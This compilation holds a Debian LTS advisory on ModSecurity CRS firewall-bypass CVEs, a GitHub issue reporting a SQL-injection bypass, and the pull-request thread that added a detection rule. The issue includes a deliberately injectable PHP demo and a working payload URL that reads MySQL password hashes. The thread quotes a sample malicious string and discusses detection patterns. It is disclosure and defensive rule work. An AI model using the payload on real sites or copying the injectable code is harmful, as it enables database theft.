=== Content from lists.debian.org_e4f41016_20250119_122838.html ===


---

[[Date Prev](msg00032.html)][[Date Next](msg00034.html)]
[[Thread Prev](msg00032.html)][[Thread Next](msg00034.html)]
[[Date Index](maillist.html#00033)]
[[Thread Index](threads.html#00033)]

# [SECURITY] [DLA 3293-1] modsecurity-crs security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3293-1] modsecurity-crs security update
* *From*: Tobias Frost <tobi@debian.org>
* *Date*: Mon, 30 Jan 2023 19:35:25 +0100
* *Message-id*: <[[üîé]](/msgid-search/Y9gN7WHc01gUcBH2%40isildor.loewenhoehle.ip)¬†[Y9gN7WHc01gUcBH2@isildor.loewenhoehle.ip](msg00033.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3293-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                         Tobias Frost
January 30, 2023                              <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : modsecurity-crs
Version        : 3.2.3-0+deb10u3
CVE ID         : CVE-2018-16384 CVE-2020-22669 CVE-2021-35368 CVE-2022-39955
                 CVE-2022-39956 CVE-2022-39957 CVE-2022-39958
Debian Bug     : 924352 992000 1021137

Multiple issues were found in modsecurity-crs, a set of generic attack
detection rules for use with ModSecurity or compatible web application
firewalls, which allows remote attackers to bypass the web applications
firewall.

If you are using modsecurity-crs with apache2 / libapache2-modsecurity, please
make sure to review your modsecurity configuration, usually
/etc/modsecurity/modsecurity.conf, against the updated recommended
configration, available in /etc/modsecurity/modsecurity.conf-recommended:
Some of the changes to the recommended rules are required to avoid WAF bypasses
in certain circumstances.

Please note that CVE-2022-39956 requires an updated modsecurity-apache packge,
which has been previously uploaded to buster-security, see Debian LTS Advisory
DLA-3283-1 for details.

If you are using some other solution in connection with the
modsecurity-ruleset, for example one that it is using libmodsecurity3, your
solution might error out with an error message like "Error creating rule:
Unknown variable: MULTIPART_PART_HEADERS". In this case you can disable the
mitigation for CVE-2022-29956 by removing the rule file
REQUEST-922-MULTIPART-ATTACK.conf.  However, be aware that this will disable
the protection and could allow attackers to bypass your Web Application
Firewall.

There is no package in Debian which depends on libmodsecurity3, so if you are
only using software which is available from Debian, you are not affected by
this limitation.

Kudos to @airween for the support and help while perparing the update.

CVE-2018-16384

    A SQL injection bypass (aka PL1 bypass) exists in OWASP ModSecurity Core Rule
    Set (owasp-modsecurity-crs) through v3.1.0-rc3 via {`a`b} where a is a special
    function name (such as "if") and b is the SQL statement to be executed.

CVE-2020-22669

    Modsecurity owasp-modsecurity-crs 3.2.0 (Paranoia level at PL1) has a SQL
    injection bypass vulnerability. Attackers can use the comment characters and
    variable assignments in the SQL syntax to bypass Modsecurity WAF protection and
    implement SQL injection attacks on Web applications.

CVE-2022-39955

    The OWASP ModSecurity Core Rule Set (CRS) is affected by a partial rule set
    bypass by submitting a specially crafted HTTP Content-Type header field that
    indicates multiple character encoding schemes. A vulnerable back-end can
    potentially be exploited by declaring multiple Content-Type "charset" names and
    therefore bypassing the configurable CRS Content-Type header "charset" allow
    list. An encoded payload can bypass CRS detection this way and may then be
    decoded by the backend. The legacy CRS versions 3.0.x and 3.1.x are affected,
    as well as the currently supported versions 3.2.1 and 3.3.2. Integrators and
    users are advised to upgrade to 3.2.2 and 3.3.3 respectively.

CVE-2022-39956

    The OWASP ModSecurity Core Rule Set (CRS) is affected by a partial rule set
    bypass for HTTP multipart requests by submitting a payload that uses a
    character encoding scheme via the Content-Type or the deprecated
    Content-Transfer-Encoding multipart MIME header fields that will not be decoded
    and inspected by the web application firewall engine and the rule set. The
    multipart payload will therefore bypass detection. A vulnerable backend that
    supports these encoding schemes can potentially be exploited. The legacy CRS
    versions 3.0.x and 3.1.x are affected, as well as the currently supported
    versions 3.2.1 and 3.3.2. Integrators and users are advised upgrade to 3.2.2
    and 3.3.3 respectively. The mitigation against these vulnerabilities depends on
    the installation of the latest ModSecurity version (v2.9.6 / v3.0.8).

CVE-2022-39957

    The OWASP ModSecurity Core Rule Set (CRS) is affected by a response body
    bypass. A client can issue an HTTP Accept header field containing an optional
    "charset" parameter in order to receive the response in an encoded form.
    Depending on the "charset", this response can not be decoded by the web
    application firewall. A restricted resource, access to which would ordinarily
    be detected, may therefore bypass detection. The legacy CRS versions 3.0.x and
    3.1.x are affected, as well as the currently supported versions 3.2.1 and
    3.3.2. Integrators and users are advised to upgrade to 3.2.2 and 3.3.3
    respectively.

CVE-2022-39958

    The OWASP ModSecurity Core Rule Set (CRS) is affected by a response body bypass
    to sequentially exfiltrate small and undetectable sections of data by
    repeatedly submitting an HTTP Range header field with a small byte range. A
    restricted resource, access to which would ordinarily be detected, may be
    exfiltrated from the backend, despite being protected by a web application
    firewall that uses CRS. Short subsections of a restricted resource may bypass
    pattern matching techniques and allow undetected access. The legacy CRS
    versions 3.0.x and 3.1.x are affected, as well as the currently supported
    versions 3.2.1 and 3.3.2. Integrators and users are advised to upgrade to 3.2.2
    and 3.3.3 respectively and to configure a CRS paranoia level of 3 or higher.

For Debian 10 buster, these problems have been fixed in version
3.2.3-0+deb10u3.

We recommend that you upgrade your modsecurity-crs packages.

For the detailed security status of modsecurity-crs please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/modsecurity-crs>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpHQhhgya57e.pgp)**

*Description:* PGP signature

---



=== Content from github.com_6bcd31af_20250119_122837.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSpiderLabs%2Fowasp-modsecurity-crs%2Fissues%2F1727)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSpiderLabs%2Fowasp-modsecurity-crs%2Fissues%2F1727)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=SpiderLabs%2Fowasp-modsecurity-crs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on May 14, 2020. It is now read-only.

[SpiderLabs](/SpiderLabs)
/
**[owasp-modsecurity-crs](/SpiderLabs/owasp-modsecurity-crs)**
Public archive

* [Notifications](/login?return_to=%2FSpiderLabs%2Fowasp-modsecurity-crs) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2FSpiderLabs%2Fowasp-modsecurity-crs)
* [Star
   2.5k](/login?return_to=%2FSpiderLabs%2Fowasp-modsecurity-crs)

* [Code](/SpiderLabs/owasp-modsecurity-crs)
* [Issues
  39](/SpiderLabs/owasp-modsecurity-crs/issues)
* [Pull requests
  6](/SpiderLabs/owasp-modsecurity-crs/pulls)
* [Actions](/SpiderLabs/owasp-modsecurity-crs/actions)
* [Projects
  0](/SpiderLabs/owasp-modsecurity-crs/projects)
* [Wiki](/SpiderLabs/owasp-modsecurity-crs/wiki)
* [Security](/SpiderLabs/owasp-modsecurity-crs/security)
* [Insights](/SpiderLabs/owasp-modsecurity-crs/pulse)

Additional navigation options

* [Code](/SpiderLabs/owasp-modsecurity-crs)
* [Issues](/SpiderLabs/owasp-modsecurity-crs/issues)
* [Pull requests](/SpiderLabs/owasp-modsecurity-crs/pulls)
* [Actions](/SpiderLabs/owasp-modsecurity-crs/actions)
* [Projects](/SpiderLabs/owasp-modsecurity-crs/projects)
* [Wiki](/SpiderLabs/owasp-modsecurity-crs/wiki)
* [Security](/SpiderLabs/owasp-modsecurity-crs/security)
* [Insights](/SpiderLabs/owasp-modsecurity-crs/pulse)

This repository has been archived by the owner on May 14, 2020. It is now read-only.

# SQLi bypass at PL1(CRS 3.2.0)¬†#1727

[Jump to bottom](#comment-composer-heading)Copy link[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[SQLi bypass at PL1(CRS 3.2.0)](#top)#1727Copy linkLabels[False Negative - Evasion](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues?q=state%3Aopen%20label%3A%22False%20Negative%20-%20Evasion%22)![@seedis](https://avatars.githubusercontent.com/u/39592354?v=4&size=80)
## Description

![@seedis](https://avatars.githubusercontent.com/u/39592354?v=4&size=48)[seedis](https://github.com/seedis)opened [on Mar 28, 2020](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1727#issue-589601789)
### Description

Fuzz found that the following request can bypass modesecurity rules and implement SQLi injection.

sample codeÔºö`user.php`(id parameter has SQL injection security issues)

```
<?php
echo "<head><title>SQL injection demo</title></head>";
$id=$_GET['id'];
$conn=new mysqli('127.0.0.1','root','root','test');
if(!$conn){
	die("Error to connect database!");
	}
	$sql="select username from user where id={$id}";
#	echo "$sql"."</br></br>";
	$res=$conn->query($sql);
	if($res){
	    $row=$res->fetch_row();
		    echo "\t Hello <b>".htmlspecialchars($row[0])." </b>,having a good day!";
			$res->free();
			$conn->close();
		}
	else{
			echo "<b>error</b>";
		}
?>

```

Database table contentsÔºö

```
mysql> use test;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from user;
+----+----------+----------------------------------+
| id | username | passwd                           |
+----+----------+----------------------------------+
|  1 | admin    | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | root     | 63a9f0ea7bb98050796b649e85481845 |
|  3 | test     | 098f6bcd4621d373cade4e832627b4f6 |
+----+----------+----------------------------------+
3 rows in set (0.00 sec)
The request is as followsÔºö

```

Normal request

```
http://127.0.0.1/user.php?id=1

```

[![image](https://user-images.githubusercontent.com/39592354/78272586-48535900-7540-11ea-8005-d5ef5cf6aadf.png)](https://user-images.githubusercontent.com/39592354/78272586-48535900-7540-11ea-8005-d5ef5cf6aadf.png)

evil request:

id=1 and 1=1 (blocked by CRS)

[![image](https://user-images.githubusercontent.com/39592354/78272800-8ea8b800-7540-11ea-8e61-6fb452527a27.png)](https://user-images.githubusercontent.com/39592354/78272800-8ea8b800-7540-11ea-8e61-6fb452527a27.png)

request(bypass CRS3.2.0) for SQL injection:

```
http://127.0.0.1/user.php?id=@.:=right(right((select authentication_string from mysql.user limit 0,1),1111),1111) union%23%0adistinctrow%0bselect@.

```

[![image](https://user-images.githubusercontent.com/39592354/77826882-46a72100-714d-11ea-8ac4-44ac9a800784.png)](https://user-images.githubusercontent.com/39592354/77826882-46a72100-714d-11ea-8ac4-44ac9a800784.png)

It can be seen that the user password in the user table in the mysql database is successfully obtained through this bypass method.

### Environment

* CRS version (e.g., v3.2.0): v3.2.0
* Paranoia level setting: PL1
* ModSecurity version (e.g., 2.9.3): 2.9.3/3.0.4
* Web Server and version (e.g, apache 2.4.41): apache2.4.18/nginx1.16.1
* Operating System and version: Ubuntu18.04
* Mysql Version: 5.7.29

Looking forward to fixing it as soon as possible beacause it threatens the security of the database content.

## Metadata

### Assignees

No one assigned

### Labels

[False Negative - Evasion](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues?q=state%3Aopen%20label%3A%22False%20Negative%20-%20Evasion%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_c1ee2b00_20250119_122838.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcoreruleset%2Fcoreruleset%2Fpull%2F1793)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcoreruleset%2Fcoreruleset%2Fpull%2F1793)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=coreruleset%2Fcoreruleset)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[coreruleset](/coreruleset)
/
**[coreruleset](/coreruleset/coreruleset)**
Public

* [Notifications](/login?return_to=%2Fcoreruleset%2Fcoreruleset) You must be signed in to change notification settings
* [Fork
  391](/login?return_to=%2Fcoreruleset%2Fcoreruleset)
* [Star
   2.4k](/login?return_to=%2Fcoreruleset%2Fcoreruleset)

* [Code](/coreruleset/coreruleset)
* [Issues
  86](/coreruleset/coreruleset/issues)
* [Pull requests
  11](/coreruleset/coreruleset/pulls)
* [Actions](/coreruleset/coreruleset/actions)
* [Projects
  0](/coreruleset/coreruleset/projects)
* [Wiki](/coreruleset/coreruleset/wiki)
* [Security](/coreruleset/coreruleset/security)
* [Insights](/coreruleset/coreruleset/pulse)

Additional navigation options

* [Code](/coreruleset/coreruleset)
* [Issues](/coreruleset/coreruleset/issues)
* [Pull requests](/coreruleset/coreruleset/pulls)
* [Actions](/coreruleset/coreruleset/actions)
* [Projects](/coreruleset/coreruleset/projects)
* [Wiki](/coreruleset/coreruleset/wiki)
* [Security](/coreruleset/coreruleset/security)
* [Insights](/coreruleset/coreruleset/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fcoreruleset%2Fcoreruleset%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fcoreruleset%2Fcoreruleset%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# SQLi using set var at PL2 #1793

 Merged

[dune73](/dune73)
merged 2 commits into
[coreruleset:v3.3/dev](/coreruleset/coreruleset/tree/v3.3/dev "coreruleset/coreruleset:v3.3/dev")
from
theMiddleBlue:fix-sqli-bypass-set-var

Dec 7, 2020

 Merged

# [SQLi using set var at PL2](#top) #1793

[dune73](/dune73)
merged 2 commits into
[coreruleset:v3.3/dev](/coreruleset/coreruleset/tree/v3.3/dev "coreruleset/coreruleset:v3.3/dev")
from
theMiddleBlue:fix-sqli-bypass-set-var

Dec 7, 2020

[Conversation
10](/coreruleset/coreruleset/pull/1793)
[Commits
2](/coreruleset/coreruleset/pull/1793/commits)
[Checks
0](/coreruleset/coreruleset/pull/1793/checks)
[Files changed](/coreruleset/coreruleset/pull/1793/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=60&v=4)](/theMiddleBlue)

Copy link

Contributor

### @theMiddleBlue **[theMiddleBlue](/theMiddleBlue)** commented [Jun 8, 2020](#issue-634436688)

Referring to [#1727](https://github.com/coreruleset/coreruleset/issues/1727) this new rule tries to block SQLi payload that uses MySQL set variable syntax at PL1.

Sorry, something went wrong.

All reactions

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=40&v=4)](/theMiddleBlue)

`[detect sqli using set var](/coreruleset/coreruleset/pull/1793/commits/1a6e9e097587cecc038f1a1a76fc067c7797bbcd "detect sqli using set var")`

`[1a6e9e0](/coreruleset/coreruleset/pull/1793/commits/1a6e9e097587cecc038f1a1a76fc067c7797bbcd)`

[![@fzipi](https://avatars.githubusercontent.com/u/3012076?s=40&v=4)](/fzipi)
[fzipi](/fzipi)
mentioned this pull request
[Jul 4, 2020](#ref-issue-650951333)

[Monthly Chat Agenda July (2020-07-06)
#1836](/coreruleset/coreruleset/issues/1836)

Closed

[![@Taiki-San](https://avatars.githubusercontent.com/u/731787?s=80&u=6fd42b1ac245a67300c6704f148fd777a3733d09&v=4)](/Taiki-San)

Copy link

Contributor

### **[Taiki-San](/Taiki-San)** commented [Jul 8, 2020](#issuecomment-655406802)

| Looked a bit into this rule and ran it on some trafic: it doesn't trigger too much but still raise a few false positives on passwords. We're also seeing a few false positives on semi-formatted data from the POST body but overall, it looks fine on our end. I feel the rule could be more specific (doesn't catch all `set bla = 0` syntaxes, ignore the `set` part) but it tackle the original report and isn't harmful on the way. |
| --- |

All reactions

Sorry, something went wrong.

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=80&u=ccc452a3b0be733012c25f5dece1be2677b592e9&v=4)](/theMiddleBlue)

Copy link

Contributor

Author

### **[theMiddleBlue](/theMiddleBlue)** commented [Jul 13, 2020](#issuecomment-657415593) ‚Ä¢ edited Loading

| still raise a few false positives on passwords  Sorry, I can't understand this statement. Can you attach an example? A password should be a free input text and if a user chooses a password like `exec(/bin/bash);'+OR+1=1--` it may trigger the whole rule-set...  We're also seeing a few false positives on semi-formatted data from the POST body  Please, if you can share them it would be really helpful to improve this rule.  doesn't catch all set bla = 0 syntaxes, ignore the set part  Yes, because (IMO) `set bla = 0` isn't something we would like to block at PL1. As you can see on [#1727](https://github.com/coreruleset/coreruleset/issues/1727) is easy to bypass libinjection and our PL1 by using both `@var:=<sql>` and `{`label`<sql>}` syntaxes. Based on my tests, this is not true by using `set variable = <sql>` syntax. If you can provide a different example of exploiting 1727 PoC by using this syntax it would be really helpful. |
| --- |

All reactions

Sorry, something went wrong.

[![@Taiki-San](https://avatars.githubusercontent.com/u/731787?s=80&u=6fd42b1ac245a67300c6704f148fd777a3733d09&v=4)](/Taiki-San)

Copy link

Contributor

### **[Taiki-San](/Taiki-San)** commented [Jul 13, 2020](#issuecomment-657428119) ‚Ä¢ edited Loading

| We run it a bit further and it actually started to trigger on scans :D Appear to overlap slightly with 942190, but it may be because it was a complex payload.  Sorry, I can't understand this statement. Can you attach an example?  The actual exemples are redacted, but not too hard to imagine: you just need to following expression somewhere in the password: `@[\w\d]+\=\S`. For exemple, `@4=d` which could quite likely appear in a randomly generated password. The password you suggested is deliberately malicious, the exemple we're having here is similar to `sh` somewhere in a randomly generated string triggering an SHI rule. I agree that free text is a challenge but we can't completely ignore it: contextualizing the rules enable fewer edge cases and wider usage. For some rules, it's highly complex, for this one it doesn't feel so.  Please, if you can share them it would be really helpful to improve this rule  I'm seeing payloads like this, although not sure where they come from: `redacted@blablav=website.com`  Based on my tests, this is not true by using set variable = syntax  Thanks a lot for the rationale, that makes a ton of sense! Could you add it in the rule's header to explain where this design came from? Will likely be useful in the future! |
| --- |

All reactions

Sorry, something went wrong.

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=80&u=ccc452a3b0be733012c25f5dece1be2677b592e9&v=4)](/theMiddleBlue)

Copy link

Contributor

Author

### **[theMiddleBlue](/theMiddleBlue)** commented [Jul 13, 2020](#issuecomment-657447135)

| The password you suggested is deliberately malicious  Yes but this is not only related to this rule. It is true for **all** CRS libinjection rules or XSS rules when a random string or base64 encoded string is provided. For example `random/onrandom==` triggers 941100 and 941120 at PL1. Those two rules should have the same behavior for you. |
| --- |

All reactions

Sorry, something went wrong.

[![@Taiki-San](https://avatars.githubusercontent.com/u/731787?s=80&u=6fd42b1ac245a67300c6704f148fd777a3733d09&v=4)](/Taiki-San)

Copy link

Contributor

### **[Taiki-San](/Taiki-San)** commented [Jul 13, 2020](#issuecomment-657529215)

| I agree, but when possible we should try to minimize it. `941120` is a good exemple of a rule that we deemed too sensitive and since disabled by default to our users.  My point isn't to be completely resilient from false positives in free text (I agree it'll be tricky) but to contextualize patterns a bit when there are low hanging fruits.  Is your point that we should keep the patterns as broad as possible, or that what I'm identifying as a low hanging fruit (looking for a `set` prefix) actually isn't? |
| --- |

All reactions

Sorry, something went wrong.

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=80&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)

Copy link

Member

### **[dune73](/dune73)** commented [Aug 3, 2020](#issuecomment-668038031)

| I'm a bit late to the show, but here is the summary of the discussion about this PR during the [project chat in July 2020](https://github.com/coreruleset/coreruleset/issues/1836#issuecomment-668031921).  "We want better documentation, better / more tests and the rule stays in PL2 kindergarden until it is proven to have only very few FPs. It can still be in PL1 for 3.4, but per default it goes to PL2." |
| --- |

All reactions

Sorry, something went wrong.

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=40&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)
[dune73](/dune73)
mentioned this pull request
[Aug 3, 2020](#ref-issue-672146679)

[Monthly Chat Agenda August (2020-08-03)
#1853](/coreruleset/coreruleset/issues/1853)

Closed

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=80&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)

Copy link

Member

### **[dune73](/dune73)** commented [Sep 7, 2020](#issuecomment-688329633)

| [@theMiddleBlue](https://github.com/theMiddleBlue) : Could you shift this to PL2 please. We'll merge as soon this is done. |
| --- |

All reactions

Sorry, something went wrong.

[![@franbuehler](https://avatars.githubusercontent.com/u/17731925?s=40&v=4)](/franbuehler)
[franbuehler](/franbuehler)
mentioned this pull request
[Sep 7, 2020](#ref-issue-688685238)

[Monthly Chat Agenda September (2020-09-07)
#1869](/coreruleset/coreruleset/issues/1869)

Closed

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=40&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)
[dune73](/dune73)
added
the
[üëÄ Needs action](/coreruleset/coreruleset/labels/%3Aeyes%3A%20Needs%20action)
label
[Sep 7, 2020](#event-3738263409)

[![@dune73](https://avatars.githubusercontent.com/u/618722?s=40&u=19aed5be603ff5cd91880863f295cc331853a517&v=4)](/dune73)
[dune73](/dune73)
mentioned this pull request
[Oct 5, 2020](#ref-issue-713645637)

[Monthly Chat Agendas October (2020-10-05 and 2020-10-19)
#1892](/coreruleset/coreruleset/issues/1892)

Closed

[![@lifeforms](https://avatars.githubusercontent.com/u/3464056?s=40&u=196f5f9afed817ea92e19dc586b4f44cf6306507&v=4)](/lifeforms)
[lifeforms](/lifeforms)
assigned [theMiddleBlue](/theMiddleBlue)
[Oct 5, 2020](#event-3842213490)

[![@lifeforms](https://avatars.githubusercontent.com/u/3464056?s=80&u=196f5f9afed817ea92e19dc586b4f44cf6306507&v=4)](/lifeforms)

Copy link

Member

### **[lifeforms](/lifeforms)** commented [Oct 5, 2020](#issuecomment-703859052)

| TODO from meeting:   * theMiddleBlue can shift to PL2 and we merge on next meeting. |
| --- |

All reactions

Sorry, something went wrong.

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=40&v=4)](/theMiddleBlue)

`[move 942520 to PL2](/coreruleset/coreruleset/pull/1793/commits/909cab560b56f998faee88dd8a7aa9cf086d2d9f "move 942520 to PL2")`

`[909cab5](/coreruleset/coreruleset/pull/1793/commits/909cab560b56f998faee88dd8a7aa9cf086d2d9f)`

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=40&u=ccc452a3b0be733012c25f5dece1be2677b592e9&v=4)](/theMiddleBlue)
[theMiddleBlue](/theMiddleBlue)
changed the title
~~SQLi using set var at PL1~~
SQLi using set var at PL2
[Oct 19, 2020](#event-3892506526)

[![@theMiddleBlue](https://avatars.githubusercontent.com/u/4454961?s=80&u=ccc452a3b0be733012c25f5dece1be2677b592e9&v=4)](/theMiddleBlue)

Copy link

Contributor

Author

### **[theMiddleBlue](/theMiddleBlue)** commented [Oct 19, 2020](#issuecomment-711978101)

| rule moved to PL2 |
| --- |

All reactions

Sorry, something went wrong.

